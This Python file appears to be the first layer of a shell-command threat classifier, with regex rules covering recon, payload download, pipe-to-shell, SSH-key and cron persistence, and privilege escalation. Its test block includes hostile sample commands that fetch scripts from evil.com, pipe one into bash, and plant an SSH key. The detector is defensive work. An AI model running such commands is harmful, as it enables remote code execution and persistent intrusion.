import re

# Each rule: (label, regex pattern, severity)
RULES = [
    ("recon",              r"\b(whoami|uname -a|id|hostname|ifconfig|ip a|cat /etc/passwd)\b", "low"),
    ("download_payload",   r"\b(wget|curl)\b.*(http|ftp)", "high"),
    ("pipe_to_shell",      r"(curl|wget).*\|\s*(bash|sh)", "critical"),
    ("persistence_ssh_key",r"authorized_keys", "critical"),
    ("persistence_cron",   r"\b(crontab|/etc/cron)", "critical"),
    ("destructive",        r"\brm\s+-rf\b", "high"),
    ("privilege_escalation",r"\b(sudo su|chmod\s+777|chmod\s+\+s)\b", "high"),
    ("network_tool_install",r"\b(apt|yum)\s+install\b.*(nmap|netcat|nc|masscan)", "high"),
    ("history_clear",      r"\b(history -c|rm.*bash_history)\b", "medium"),
    ("shell_spawn",        r"\b(python3? -c|perl -e|/bin/sh -i)\b", "high"),
]

def classify_rule_based(command: str):
    """
    Returns (label, severity) if a rule matches, else None.
    None means: escalate to Layer 2 (ML model).
    """
    cmd = command.strip().lower()
    for label, pattern, severity in RULES:
        if re.search(pattern, cmd, re.IGNORECASE):
            return {"label": label, "severity": severity, "layer": "rule"}
    return None


if __name__ == "__main__":
    tests = [
        "wget http://evil.com/malware.sh -O /tmp/m.sh",
        "curl http://evil.com/x.sh | bash",
        "echo 'ssh-rsa AAAA...' >> ~/.ssh/authorized_keys",
        "ls -la",
        "whoami",
    ]
    for t in tests:
        print(t, "->", classify_rule_based(t))
